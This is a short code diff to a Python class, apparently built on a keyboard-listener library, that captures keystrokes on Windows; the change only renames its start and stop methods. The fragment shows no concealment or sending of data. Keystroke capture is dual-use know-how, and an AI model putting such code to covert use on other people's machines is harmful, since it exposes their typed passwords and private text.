@@ -37,11 +37,11 @@ class WindowsKeyLogger(IKeyLogger):
         if key == keyboard.Key.esc:
             return False  # stop listener
 
-    def start_logging(self):
+    def start(self):
         self.listener.start()
         self.listener.join()
 
-    def stop_logging(self):
+    def stop(self):
         self.listener.stop()
 
     def get_logged_keys(self) -> List[str]:
